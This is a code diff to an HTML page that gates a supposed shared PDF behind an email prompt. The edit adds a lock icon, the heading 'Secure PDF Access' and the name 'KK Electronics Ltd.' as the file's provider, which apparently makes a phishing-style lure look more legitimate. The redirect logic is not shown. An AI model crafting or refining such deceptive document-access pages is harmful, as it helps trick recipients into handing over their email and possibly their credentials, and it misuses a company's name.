@@ -36,6 +36,14 @@
             font-size: 2em;
             margin-bottom: 10px;
             color: #2c3e50;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        h2 i {
+            font-size: 1.5em;
+            color: #6e8efb;
         }
         p {
             font-size: 1.1em;
@@ -86,14 +94,17 @@
         }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 </head>
 <body>
     <div class="container">
-        <h2>Welcome Aboard!</h2>
-        <p>Enter your email to view the File.</p>
-        <input type="email" id="emailInput" placeholder="Enter your email" required>
-        <p id="errorMessage" class="error">Please enter a valid email address.</p>
-        <button onclick="validateAndRedirect()">Continue</button>
+        <h2><i class="fas fa-lock"></i> Secure PDF Access</h2>
+        <p>Enter your email to view the file provided by KK Electronics Ltd.</p>
+        <form onsubmit="event.preventDefault(); validateAndRedirect();">
+            <input type="email" id="emailInput" placeholder="Enter your email" required>
+            <p id="errorMessage" class="error">Please enter a valid email address.</p>
+            <button type="submit">Continue</button>
+        </form>
     </div>
 
     <script>
